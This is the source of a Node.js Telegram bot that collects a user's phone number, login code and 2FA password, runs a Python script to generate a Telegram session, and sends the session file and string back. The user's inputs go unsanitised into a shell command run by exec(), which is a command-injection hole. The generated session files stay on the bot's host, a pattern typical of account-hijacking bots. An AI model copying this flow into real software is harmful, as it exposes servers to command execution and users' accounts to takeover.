import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import express from "express";
import dotenv from "dotenv";

dotenv.config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;

const userState = {};

// STEP 0: Start
bot.start((ctx) => {
  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Please send your phone number (+123...).");
});

// STEP 1: Handle messages
bot.on("text", (ctx) => {
  const userId = ctx.chat.id;
  const msg = ctx.message.text.trim();

  // STEP 3: Handle 2FA password
  if (userState[userId]?.waitingForPassword) {
    ctx.reply("⏳ Verifying password...");
    const { phone, otp } = userState[userId];
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;

    exec(command, (error, stdout) => {
      if (error) return ctx.reply("❌ Verification failed.");

      stdout = stdout.trim();
      if (stdout.includes("SESSION_FILE")) {
        ctx.reply("✅ Session generated!");
        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
        }

        const match = stdout.match(/STRING_SESSION=(.+)/);
        if (match) {
          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
        }
      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 2: Handle OTP
  if (userState[userId]?.waitingForOtp) {
    ctx.reply("⏳ Verifying OTP...");
    const phone = userState[userId].phone;
    const otp = msg;
    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;

    exec(command, (error, stdout) => {
      if (error) return ctx.reply("❌ OTP verification failed.");

      stdout = stdout.trim();
      if (stdout.includes("NEED_2FA")) {
        userState[userId] = { phone, otp, waitingForPassword: true };
        return ctx.reply("🔒 Your account has 2FA enabled. Please send your password:");
      }

      if (stdout.includes("SESSION_FILE")) {
        ctx.reply("✅ Session generated!");
        const filePath = `${phone}.session`;
        if (fs.existsSync(filePath)) {
          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
        }

        const match = stdout.match(/STRING_SESSION=(.+)/);
        if (match) {
          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
        }
      } else {
        ctx.reply("❌ Failed to generate session.");
      }

      userState[userId] = {};
    });
    return;
  }

  // STEP 1: Handle phone number
  if (msg.startsWith("+") && msg.length > 10) {
    ctx.reply("📲 Sending OTP to your phone...");
    const command = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;

    exec(command, (error, stdout) => {
      if (error || !stdout.includes("CODE_REQUESTED")) {
        return ctx.reply("❌ Failed to send OTP.");
      }

      userState[userId] = { phone: msg, waitingForOtp: true };
      ctx.reply("✅ OTP sent! Please enter the code you received:");
    });
  } else {
    ctx.reply("❌ Please send a valid phone number (+123...).");
  }
});

// ================= EXPRESS WEB STATUS =================
const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("<h1>🤖 Telegram Bot Status</h1><p>✅ Bot is running!</p>");
});

app.listen(PORT, () => {
  console.log(`🌐 Status page running at http://localhost:${PORT}`);
});

bot.launch();
console.log("🚀 Bot running...");
        
